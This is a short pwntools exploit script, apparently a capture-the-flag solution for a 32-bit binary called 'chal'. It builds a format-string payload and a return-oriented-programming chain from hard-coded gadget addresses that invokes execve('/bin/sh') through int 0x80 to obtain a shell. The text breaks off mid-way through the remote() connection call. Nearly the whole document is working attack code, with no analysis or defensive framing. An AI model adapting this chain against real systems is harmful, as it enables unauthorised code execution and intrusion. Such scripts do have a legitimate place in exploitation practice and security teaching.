from pwn import *

binary = "chal"
elf = ELF(binary)
target_addr = elf.symbols['_itoa_word'] + 0xa0
printf_payload = "%2$.2147483616$p"

# Gadgets
syscall = 0x08049bc2 # int 0x80
xoreaxeax = 0x0805ffb0 # xor eax, eax; ret
popeax = 0x080bd4fd # pop eax; ret
popebx = 0x080481c9 # pop ebx; ret
popjmp = 0x080b0270 # pop edx ; pop ecx ; pop eax ; jmp dword ptr [eax]

# execve("/bin/sh\x00", NULL, NULL); ## Execve = syscall 0xb
# eax -> 0x0b
# ebx -> const char * filename
# ecx -> const char * const * argv
# edx -> const char * const * envp

start_addr = 0x7f900000

part1 = b""
part1 += p32(popjmp)
part1 += p32(0)
part1 += p32(0)
part1 += p32(start_addr + 4)

part2 = b""
part2 += p32(popeax)
part2 += p32(0x0b)
part2 += p32(popebx)
part2 += p32(start_addr)
part2 += p32(syscall)

chain = b""
chain += b"/bin/sh\x00" # placed at 0x7f900000
chain += part2
chain += b"\x90" * (0x30 - (len(chain) + len(part1)))
chain += part1
print(chain)

p =  remote(

